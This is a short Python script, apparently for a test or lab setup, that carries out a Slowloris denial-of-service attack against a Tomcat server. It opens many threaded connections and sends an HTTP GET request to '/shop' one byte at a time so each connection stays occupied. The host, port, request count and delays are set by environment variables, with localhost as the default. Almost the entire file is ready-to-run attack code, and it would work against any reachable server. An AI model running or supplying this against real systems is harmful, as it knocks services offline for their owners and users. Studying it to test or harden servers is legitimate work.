import logging
import os
import socket
import threading
import time

logging.root.setLevel(logging.DEBUG)

# Number of requests to initiate in total
NUM_REQUESTS_TO_START = int(os.environ["NUM_REQUESTS_TO_START"] or 200)
# Delay (secs) between each concurrent request thread
TIME_BETWEEN_REQUESTS = float(os.environ["TIME_BETWEEN_REQUESTS"] or 0.05)
# Delay (secs) between each byte sent to server
TIME_BETWEEN_BYTES = float(os.environ["TIME_BETWEEN_BYTES"] or 1)
# Hostname of the tomcat server
HOST = os.environ['HOST'] or 'localhost'
# tomcat server port
PORT = int(os.environ['PORT'] or 8888)

logging.debug(f'NUM_REQUESTS_TO_START={NUM_REQUESTS_TO_START}')
logging.debug(f'TIME_BETWEEN_REQUESTS={TIME_BETWEEN_REQUESTS}')
logging.debug(f'TIME_BETWEEN_BYTES={TIME_BETWEEN_BYTES}')
logging.debug(f'HOST={HOST}')
logging.debug(f'PORT={PORT}')


def slow_loris_attack():
    get_request = create_simple_get_request("/shop")

    for request_num in range(NUM_REQUESTS_TO_START):
        threading.Thread(target=send_very_slowly, args=(str(request_num), get_request,)).start()
        time.sleep(TIME_BETWEEN_REQUESTS)


def create_simple_get_request(path: str):
    lines = [
        f"GET {path} HTTP/1.1",
        f"Accept: text/html",
        f"Cache-Control: no-cache",
        f"Connection: keep-alive",
        f"Host: {HOST}:{PORT}",
        f""
    ]
    return "\r\n".join(lines)


def send_very_slowly(num: str, http_request: str):
    logging.debug("Sending request (%s), total request size %d bytes", num, len(http_request))
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        for char in http_request:
            s.sendall(str.encode(char))
            time.sleep(TIME_BETWEEN_BYTES)
        data = s.recv(1024)
    logging.debug('Response for request (%s): %s', num, repr(data))


if __name__ == '__main__':
    slow_loris_attack()
